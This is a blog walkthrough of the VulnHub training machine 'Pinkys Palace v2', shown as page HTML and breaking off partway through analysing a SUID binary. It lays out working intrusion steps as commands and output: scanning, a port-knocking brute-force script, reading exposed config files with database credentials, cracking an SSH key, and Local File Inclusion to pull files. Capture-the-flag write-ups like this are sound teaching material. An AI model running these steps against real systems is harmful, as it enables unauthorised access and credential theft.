<!DOCTYPE html>
<html lang="en" class="html" data-theme="dark"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      VulnHub - Pinkys Palace v2
    
  </title>

  <!-- Begin Jekyll SEO tag v2.7.3 -->
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="VulnHub - Pinkys Palace v2" />
<meta name="author" content="s4rgaz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Description: A realistic Boot2Root." />
<meta property="og:description" content="Description: A realistic Boot2Root." />
<link rel="canonical" href="http://localhost:4000/pinkys-palace-v2.html" />
<meta property="og:url" content="http://localhost:4000/pinkys-palace-v2.html" />
<meta property="og:site_name" content="Home" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/pinkys-palace-v2.html" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-18T00:00:00-05:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/pinkys-palace-v2.html" />
<meta property="twitter:title" content="VulnHub - Pinkys Palace v2" />
<script type="application/ld+json">
{"headline":"VulnHub - Pinkys Palace v2","dateModified":"2021-12-18T00:00:00-05:00","datePublished":"2021-12-18T00:00:00-05:00","url":"http://localhost:4000/pinkys-palace-v2.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pinkys-palace-v2.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: A realistic Boot2Root.","@context":"https://schema.org"}</script>
<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
<!-- End Jekyll SEO tag -->
 
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />

  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
  
    <script type="text/javascript">
  window.addEventListener('load', themeChange);
  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
  if (currentTheme)
    document.documentElement.setAttribute('data-theme', currentTheme);

  function themeChange() {
    let button = document.querySelector('.theme-toggle');

    button.addEventListener('click', function (e) {
      let currentTheme = document.documentElement.getAttribute('data-theme');
      if (currentTheme === 'dark') {
        transition();
        document.documentElement.setAttribute('data-theme', 'light');
        localStorage.setItem('theme', 'light');
      } else {
        transition();
        document.documentElement.setAttribute('data-theme', 'dark');
        localStorage.setItem('theme', 'dark');
      }
    });

    let transition = () => {
      document.documentElement.classList.add('transition');
      window.setTimeout(() => {
        document.documentElement.classList.remove('transition');
      }, 1000);
    }
  }
</script>


  

</head>
<body>
    <main class="page-content" aria-label="Content">
      <div class="w">
        <header>

<ul class="horizontal-list">
  
    <li>
      <a href="/">
        Home
      </a>
      &nbsp;&nbsp;
    </li>
  
    <li>
      <a href="/walkthroughs">
        Walkthroughs
      </a>
      &nbsp;&nbsp;
    </li>
  
    <li>
      <a href="/about">
        About
      </a>
      &nbsp;&nbsp;
    </li>
  
</ul>
 
<!--  <div class="dashed"></div> -->


<!--  <h1>Home</h1> -->
  
</header>

<a href="/"></a>
<h1 class="post-title">VulnHub - Pinkys Palace v2</h1> 
<p class="post-date text-bold text-upcase">
  
    <span>December 2021</span>
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>
 
<p><strong>Description:</strong> A realistic Boot2Root.</p>

<p><strong>Author:</strong> Pink_Panther</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Gain access to the system and read the /root/root.txt.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pinkys-palace-v2,229/">https://www.vulnhub.com/entry/pinkys-palace-v2,229/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan on the local network discovered the target machine, the script can be found <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.178 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>With the aim of revealing open ports a full TCP port scan was performed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> 192.168.179.178 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>As we know, that only port 80 is open, we proceed to get more information about this port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span> 192.168.179.178 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>For a correct resolution of the web page, we add the following instruction to the hosts file on the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.178 pinkydb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>Now, We can browse in the web page, it’s a wordpress.</p>

<p><img src="/assets/images/pinkysv2/screenshot-1.png" alt="" /></p>

<p>With wpscan we can do an additional enumeration in wordpress to detect vulnerable plugins and themes, as well as existing users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://pinkydb/ <span class="nt">-e</span> vp,vt,u
...
<span class="o">[</span>+] XML-RPC seems to be enabled: http://pinkydb/xmlrpc.php    
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>             
 | Confidence: 100%
 ...
 <span class="o">[</span>+] WordPress version 4.9.4 identified <span class="o">(</span>Insecure, released on 2018-02-06<span class="o">)</span><span class="nb">.</span>
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 ...
<span class="o">[</span>+] WordPress version 4.9.4 identified <span class="o">(</span>Insecure, released on 2018-02-06<span class="o">)</span><span class="nb">.</span>  
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>                             
 |  - http://pinkydb/?feed<span class="o">=</span>rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.9.4&lt;/generator&gt; 
 |  - http://pinkydb/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.9.4&lt;/generator&gt;
...
<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] pinky1337
 | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
 ...
</code></pre></div></div>

<p>This reveals the wordpress version and a user, with the objective of discovering more information, I ran dirb to find hidden web content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://pinkydb 
...
<span class="nt">----</span> Scanning URL: http://pinkydb/ <span class="nt">----</span>
+ http://pinkydb/index.php <span class="o">(</span>CODE:301|SIZE:0<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/secret/     
+ http://pinkydb/server-status <span class="o">(</span>CODE:403|SIZE:295<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wordpress/ 
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-admin/   
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-content/  
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/wp-includes/ 
+ http://pinkydb/xmlrpc.php <span class="o">(</span>CODE:405|SIZE:42<span class="o">)</span>
...
</code></pre></div></div>

<p>At the previous exit, we can see a directory called secret, so we access to it.</p>

<p><img src="/assets/images/pinkysv2/screenshot-2.png" alt="" /></p>

<p>This contains three numbers as a sequence of ports and the word pinkydb.</p>

<p><img src="/assets/images/pinkysv2/screenshot-3.png" alt="" /></p>

<p>There is a technique called “Port Knoking” that allows us to open ports, when connecting to a series of ports in the correct order, I wrote a python script to discover the correct order of the sequence, in such a way it was possible to open the filtered ports found with nmap.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">itertools</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.179.178"</span>
<span class="n">ports</span> <span class="o">=</span> <span class="p">[</span><span class="mi">8890</span><span class="p">,</span> <span class="mi">7000</span><span class="p">,</span> <span class="mi">666</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">connection</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">permutation</span> <span class="o">=</span> <span class="n">itertools</span><span class="p">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">)</span>

<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">permutation</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">f"Trying  =&gt; </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">connection</span><span class="p">(</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">connection</span><span class="p">(</span><span class="mi">31337</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="se">\n</span><span class="s">Success =&gt; </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">port</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span><span class="mi">5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script, and find the correct sequence to open the ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 knock.py            
Trying  <span class="o">=&gt;</span>  8890  7000   666
Trying  <span class="o">=&gt;</span>  8890   666  7000
Trying  <span class="o">=&gt;</span>  7000  8890   666
Trying  <span class="o">=&gt;</span>  7000   666  8890

Success <span class="o">=&gt;</span>  7000   666  8890
</code></pre></div></div>

<p>We can check if the filtered ports are open simply performing a re-scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p4655</span>,7654,31337 192.168.179.178
...
PORT      STATE SERVICE
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
...
</code></pre></div></div>

<p>Now, we can discover the service and version of the available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-A</span> <span class="nt">-p4655</span>,7654,31337 192.168.179.178
...
PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 <span class="o">(</span>RSA<span class="o">)</span>
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 <span class="o">(</span>ED25519<span class="o">)</span>
7654/tcp  open  http    nginx 1.10.3
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings:
|   GenericLines, NULL:
|     <span class="o">[</span>+] Welcome to The Daemon <span class="o">[</span>+]
|     This is soon to be our backdoor
|     into Pinky<span class="s1">'s Palace.
|   GetRequest:
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky'</span>s Palace.
|     HTTP/1.0
|   SIPOptions:
|     <span class="o">[</span>+] Welcome to The Daemon <span class="o">[</span>+]
|     This is soon to be our backdoor
|     into Pinky<span class="s1">'s Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: &lt;sip:nm@nm&gt;;tag=root
|     &lt;sip:nm2@nm2&gt;
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: &lt;sip:nm@nm&gt;
|_    Accept: application/sdp
...
</span></code></pre></div></div>

<h3 id="enumeration-on-port-7654">Enumeration on port 7654</h3>

<p>The web service that runs on port 7654 contains a login form, but we don’t know the credentials.</p>

<p><img src="/assets/images/pinkysv2/screenshot-4.png" alt="" /></p>

<p><img src="/assets/images/pinkysv2/screenshot-5.png" alt="" /></p>

<p>I ran gobuster in order to discover any interesting information, but nothing.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://pinkydb:7654 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> php,html
...
http://pinkydb:7654/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 134]
http://pinkydb:7654/login.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 545]
http://pinkydb:7654/config.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]
...
</code></pre></div></div>

<p>Then, I ran gobuster again this time specifying the IP address instead of the host name.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.178:7654 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
...
http://192.168.179.178:7654/apache               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.178:7654/apache/]
http://192.168.179.178:7654/nginx                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.178:7654/nginx/] 
...
</code></pre></div></div>

<p>In this ocasion, two directories were found, then a simple enumeration with dirb under the apache directory discovered the same content as on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.178:7654/apache/ <span class="nt">-r</span>
...
<span class="nt">----</span> Scanning URL: http://192.168.179.178:7654/apache/ <span class="nt">----</span>
+ http://192.168.179.178:7654/apache/.htaccess <span class="o">(</span>CODE:200|SIZE:235<span class="o">)</span> 
+ http://192.168.179.178:7654/apache/index.php <span class="o">(</span>CODE:200|SIZE:418<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/secret/       
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wordpress/  
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-admin/    
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-content/  
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/apache/wp-includes/ 
+ http://192.168.179.178:7654/apache/xmlrpc.php <span class="o">(</span>CODE:200|SIZE:3065<span class="o">)</span>
</code></pre></div></div>

<p>When verifying the resources found, I could see that it is possible to download the content web.</p>

<p><img src="/assets/images/pinkysv2/screenshot-6.png" alt="" /></p>

<p>We can use curl to download and read the wordpress configuration file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/apache/wp-config.php 
...
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'pwp_db'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'pinkywp'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'pinkydbpass_wp'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
define('</span>DB_COLLATE<span class="s1">', '');
...
</span></code></pre></div></div>

<p>Under the nginx directory, the php files of the login form that run on port 7654 was found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.178:7654/nginx/pinkydb/
...
<span class="nt">----</span> Scanning URL: http://192.168.179.178:7654/nginx/pinkydb/ <span class="nt">----</span>
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.178:7654/nginx/pinkydb/html/    
                                                                          
<span class="nt">----</span> Entering directory: http://192.168.179.178:7654/nginx/pinkydb/html/ <span class="nt">----</span>
+ http://192.168.179.178:7654/nginx/pinkydb/html/index.php <span class="o">(</span>CODE:200|SIZE:134<span class="o">)</span>
...
</code></pre></div></div>

<p>We list the connection to the database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/nginx/pinkydb/html/config.php
&lt;?php
        define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'secretpinkdbuser'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_PASS'</span>, <span class="s1">'pinkyssecretdbpass'</span><span class="o">)</span><span class="p">;</span>
        define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'secretsdb'</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$conn</span> <span class="o">=</span> mysqli_connect<span class="o">(</span>DB_HOST,DB_USER,DB_PASS,DB_NAME<span class="o">)</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p>listing the login.php file, we see a link to a page that redirects a user when they have successfully logged in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.178:7654/nginx/pinkydb/html/login.php | <span class="nb">head</span> <span class="nt">-20</span>
&lt;?php
        include<span class="o">(</span><span class="s2">"config.php"</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$USER</span> <span class="o">=</span> mysqli_real_escape_string<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'user'</span><span class="o">])</span><span class="p">;</span>
        <span class="nv">$PASS</span> <span class="o">=</span> mysqli_real_escape_string<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])</span><span class="p">;</span>
        <span class="nv">$PASS</span> <span class="o">=</span> md5<span class="o">(</span><span class="nv">$PASS</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$statement</span> <span class="o">=</span> <span class="s2">"SELECT id FROM users WHERE username = '</span><span class="nv">$USER</span><span class="s2">' and password = '</span><span class="nv">$PASS</span><span class="s2">'"</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> mysqli_query<span class="o">(</span><span class="nv">$conn</span>,<span class="nv">$statement</span><span class="o">)</span><span class="p">;</span>
        <span class="nv">$row</span> <span class="o">=</span> mysqli_fetch_array<span class="o">(</span><span class="nv">$result</span>,MYSQLI_ASSOC<span class="o">)</span><span class="p">;</span>
        <span class="nv">$active</span> <span class="o">=</span> <span class="nv">$row</span><span class="o">[</span><span class="s1">'active'</span><span class="o">]</span><span class="p">;</span>
        <span class="nv">$count</span> <span class="o">=</span> mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span><span class="p">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="nv">$count</span> <span class="o">==</span> 1<span class="o">)</span>
        <span class="o">{</span>
                header<span class="o">(</span><span class="s2">"Location: http://pinkydb:7654/pageegap.php?1337=filesselif1001.php"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
        <span class="k">else if</span> <span class="o">(</span><span class="nv">$count</span> <span class="o">!=</span> 1<span class="o">)</span>
        <span class="o">{</span>
                <span class="nb">echo</span> <span class="s2">"&lt;center&gt;Invalid Username or Password!&lt;/center&gt;"</span><span class="p">;</span>
        <span class="o">}</span>
</code></pre></div></div>

<p>This contains a link to an rsa key and a note.</p>

<p><img src="/assets/images/pinkysv2/screenshot-7.png" alt="" /></p>

<p>We first download the private key to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://pinkydb:7654/credentialsdir1425364865/id_rsa
</code></pre></div></div>

<p>We review the note, it contains the username for the rsa key.</p>

<p><img src="/assets/images/pinkysv2/screenshot-8.png" alt="" /></p>

<p>Then, we convert the private key to a format that john can crack it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> ssh.hash

root@kali:~<span class="nv">$ </span>john ssh.has <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nt">--format</span><span class="o">=</span>SSH
...
secretz101       <span class="o">(</span>id_rsa<span class="o">)</span>
</code></pre></div></div>

<p>Now, That the password is found, we can log in via SSH to the target machine.</p>

<p>To testing the parameter <strong>1337</strong>, was found that it is vulnerable to Local File Inclusion.</p>

<p><img src="/assets/images/pinkysv2/screenshot-9.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>Before logging in, we need to grant the following permissions to the RSA private key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
</code></pre></div></div>

<p>We access via SSH to the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh stefano@192.168.179.178 <span class="nt">-p</span> 4655 <span class="nt">-i</span> id_rsa    
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>stefano<span class="o">)</span>
</code></pre></div></div>

<p>In the history file, from user stefano, there is a binary file that looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history
...
<span class="nb">cd</span> /usr/local/bin
<span class="nb">ls
ls</span> <span class="nt">-al</span>
<span class="nb">cat </span>backup.sh
...
</code></pre></div></div>

<p>By listing the SUID binaries, was found the following binary in the stefano’s home directory, we will use it to escalate privileges as the user pinky.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null 
<span class="nt">-rwsr----x</span> 1 pinky www-data 13384 Mar 16  2018 /home/stefano/tools/qsub
...
</code></pre></div></div>

<p>We execute the binary and it seems that it requires a message as input, in the same directory as the binary there is a note specifying that the program was made to send messages.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>/home/stefano/tools/qsub 
/home/stefano/tools/qsub &lt;Message&gt;
stefano@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">cat </span>tools/note.txt 
Pinky made me this program so I can easily send messages to him.
</code></pre></div></div>

<p>We cannot analyze the binary file on the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stefano@Pinkys-Palace:~<span class="nv">$ </span>strings /home/stefano/tools/qsub 
strings: /home/stefano/tools/qsub: Permission denied
</code></pre></div></div>

<p>So the best thing we can do is download it to the attacking machine, to do this I will use the discovered Local File Inclusion vulnerability.</p>

<p><img src="/assets/images/pinkysv2/screenshot-10.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://pinkydb:7654/pageegap.php?1337<span class="o">=</span>/home/stefano/tools/qsub <span class="nt">-O</span> qsub
</code></pre></div></div>

<p>We give it execution privileges, using the strings command we see that the text displayed by echo is added to a file located in the pinky’s home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x qsub
root@kali:~<span class="nv">$ </span>strings qsub
...
/bin/echo %s <span class="o">&gt;&gt;</span> /home/pinky/messages/stefano_msg.txt  
%s &lt;Message&gt;                                           
TERM                                              
<span class="o">[</span>+] Input Password:                         
Bad hacker! Go away!                 
<span class="o">[</span>+] Welcome to Question Submit!    
<span class="o">[!]</span> Incorrect Password!
...
</code></pre></div></div>

<p>When analyzing the binary with ltrace we can see that the value of the environment variable <strong>$TERM</strong> is used to compare with the password entered by the user, if they are the same, the message is sent otherwise it gives an error.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ltrace ./qsub <span class="nb">test
